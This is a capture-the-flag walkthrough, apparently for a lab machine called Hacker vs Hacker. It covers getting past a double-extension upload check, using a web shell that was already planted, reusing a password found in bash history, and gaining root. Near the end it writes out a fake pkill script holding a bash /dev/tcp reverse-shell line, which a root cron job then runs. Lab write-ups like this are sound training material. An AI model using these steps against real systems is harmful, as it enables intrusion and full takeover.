# Hacker-vs-Hacker-Writeup

Initial nmap scan revealed only 2 ports - 22 and 80 so I dived into them:

<img width="1434" height="938" alt="image" src="https://github.com/user-attachments/assets/cea17331-379d-4213-b561-7cf2c231fec8" />

This didn't reveal anything too useful so I ran nikto just in case:

<img width="1419" height="786" alt="image" src="https://github.com/user-attachments/assets/8f9e0057-898d-41cc-ac2f-99a2bc7b66e3" />

And at the same time checked out the simple http page in browser, almost immediately we find a comment near the upload button:

<img width="927" height="400" alt="image" src="https://github.com/user-attachments/assets/05ef9608-6c82-49b3-aa76-93040eafd0bb" />

This reveals the logic behind pdf file upload and means hacker bypassed that. After some research I found out that this is extremely easy to bypass since the strpos is used - we can just create a file with 2 extensions like webshell.pdf.php and it will work.

I then used the pentestmonkey's standard reverse shell but apparently it didn't work... After a while I realised that since message says "Hacked" and this is post compromise someone already uploaded this, so I used ffuf to enumerate /cvs and found this:

<img width="1226" height="166" alt="image" src="https://github.com/user-attachments/assets/1e819324-3be9-40e0-a317-ea7c3d376ddf" />

A parameter cmd I typed worked at first try, I got lucky here...
Anyway, user.txt is located in user's home:

<img width="439" height="102" alt="image" src="https://github.com/user-attachments/assets/7a537964-efa9-43b5-ad21-b96e823f6074" />

But we need easier and faster access so a one-liner reverse shell is in order.

<img width="398" height="684" alt="image" src="https://github.com/user-attachments/assets/cb6d8043-4414-472f-afc0-e81e6fa3ec81" />

Tried a bunch of shells but for some reason they didn't work, even the php one so I used browser to do some enum and noticed .bash_history:

<img width="1330" height="276" alt="image" src="https://github.com/user-attachments/assets/db3b6ce4-1a85-426a-aaa1-4d832144e0fd" />

This means we now have a password of lachlan and hopefully ssh works (it did...):

<img width="654" height="278" alt="image" src="https://github.com/user-attachments/assets/26ead1bb-90f4-4f23-bb04-f12b9c3ed3f7" />

I've already seen things like that when you get immediately kicked out, but now instead of checking systemd or crontabs and processes I decided to use the trick:

ssh -o ServerAliveInterval=1 -o ServerAliveCountMax=999 user@host
ssh -tt user@host
ssh -T user@host

Basically these are ways to not get kicked out - force a keepalive buy sending it every n seconds, force non-interactive shell, disable pseudo-TTY allocation.

First 2 didn't work but the last one worked as a charm!

<img width="638" height="341" alt="image" src="https://github.com/user-attachments/assets/2d4ad689-682b-4b74-af94-b16110f845af" />

As suspected, there is malicious crontab:

<img width="1431" height="504" alt="image" src="https://github.com/user-attachments/assets/ce65e001-f788-4bd4-8576-96bbac2b242a" />

As we see the PATH env includes /home/lachlan/bin which we have write access to, and since path to pkill is unspecified we can create a pkill file ourselves with a reverse shell and once the crontab runs (with root privs) it will gain us root on a machine:

echo "#!/bin/bash" > /home/lachlan/bin/pkill
echo "bash -i >& /dev/tcp/IP/4444 0>&1" >> /home/lachlan/bin/pkill
chmod +x /home/lachlan/bin/pkill

After only a couple seconds:

bash: cannot set terminal process group (3159): Inappropriate ioctl for device                                                                                                                           
bash: no job control in this shell                                                                                                                                                                       
root@b2r:~#  

We have the root flag:

<img width="997" height="434" alt="image" src="https://github.com/user-attachments/assets/54e1a4a5-e813-4292-92b0-b6b64bde54ff" />

This was good room, sometimes a little confusing but overall it's fairly rated as Easy, though some tricks and the logic is sometimes pretty not-obvious type.
